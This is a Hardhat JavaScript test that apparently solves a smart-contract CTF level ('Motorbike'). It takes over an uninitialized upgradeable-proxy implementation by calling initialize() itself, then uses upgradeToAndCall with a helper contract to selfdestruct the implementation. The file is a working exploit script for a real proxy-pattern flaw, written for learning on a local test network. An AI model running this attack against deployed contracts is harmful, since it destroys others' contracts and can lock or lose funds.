
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();

        const Level25Implementation = await hre.ethers.getContractFactory("Engine");
        const level25Implementation = await Level25Implementation.deploy();
        await level25Implementation.deployed();

        const Level25Helper = await hre.ethers.getContractFactory("BadEngine");
        const level25Helper = await Level25Helper.deploy();
        await level25Helper.deployed();

        const Level25 = await hre.ethers.getContractFactory("Motorbike");
        const level25 = await Level25.deploy(level25Implementation.address);
        await level25.deployed();
        console.log(
          `Level25 deployed at address ${level25.address}`
        )
        console.log(
          `Level25Implementation deployed at address ${level25Implementation.address}`
        )
        console.log(
          `Level25Helper deployed at address ${level25Helper.address}`
        )
        return {level25, level25Implementation, level25Helper, owner, otherAccount};
    }

    /*
      You'll need to hijack this wallet to become the admin of the proxy.
    */
    describe("Solve", function() {
        it("Should solve level25", async function() {
            const {level25, level25Implementation, level25Helper, owner, otherAccount} = await loadFixture(deployFallback);

            const implementationABI = require("../artifacts/contracts/level25/level25.sol/Engine.json")
            const iface = new ethers.utils.Interface(implementationABI.abi);
            const proxyABI = require("../artifacts/contracts/level25/level25.sol/Engine.json")
            const ifaceProxy = new ethers.utils.Interface(proxyABI.abi);
            const helperABI = require("../artifacts/contracts/level25/level25helper.sol/BadEngine.json")
            const helperIface = new ethers.utils.Interface(helperABI.abi);


            // Initialize the implementation in its own context, we are the uprader
            // We could also do this from our own proxy contract
            await level25Implementation.connect(otherAccount).initialize();

            // We've deployed a contract with a function that calls selfdestruct
            // Get the calldata for that function and for the upgradeToAndCall function in the implementation
            const selfDestructCallData = helperIface.encodeFunctionData("destroy", []);
            const upgradeToAndCallData = iface.encodeFunctionData("upgradeToAndCall", [level25Helper.address, selfDestructCallData]);

            // Call upgradeToAndCall passing our helper contract and the destroy() function
            // This forces the implementation contract to delegatecall into our contract, which calls selfdestruct
            // within the context of the implementation contract, destroying it
            tx = {to: level25Implementation.address,
                  data: upgradeToAndCallData,
                  gasLimit: 3000000}

            await otherAccount.sendTransaction(tx);

            // if we successfully self-destructed the implementation, it should have no code
            const code = await ethers.provider.getCode(level25Implementation.address)
            expect(code).equals("0x");;
        })
    });
});